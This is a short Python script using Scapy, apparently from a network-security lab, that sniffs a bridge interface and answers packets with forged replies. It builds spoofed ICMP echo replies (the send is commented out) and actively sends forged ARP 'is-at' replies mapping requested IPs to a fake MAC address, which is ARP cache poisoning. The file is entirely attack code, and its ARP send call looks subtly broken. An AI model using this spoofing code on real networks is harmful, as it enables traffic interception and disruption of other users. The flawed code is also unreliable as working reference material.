#!/usr/bin/python3
from scapy.all import *
from sys import *

def sniff_and_spoof(pkt):
    if ICMP in pkt:
        ip = IP(src = pkt[Ether][IP].dst, dst = pkt[Ether][IP].src)
        icmp = ICMP(type='echo-reply', id=pkt[Ether][IP][ICMP].id, seq=pkt[Ether][IP][ICMP].seq)
        raw_data = pkt[Ether][IP][ICMP][Raw]
        newpacket = ip/icmp/raw_data
        #send(newpacket, verbose = 0)
    elif ARP in pkt:
        pkt.show()
        send(Ether(dst=pkt[Ether].src, type='ARP')/ARP(op='is-at', psrc=pkt[Ether][ARP].pdst,
        pdst = pkt[Ether][ARP].psrc, hwsrc = 'AA:BB:CC:DD:EE:FF',
        hwdst = pkt[Ether][ARP].hwsrc))


pkt = sniff(iface='br-c912b7f540a9',prn=sniff_and_spoof)


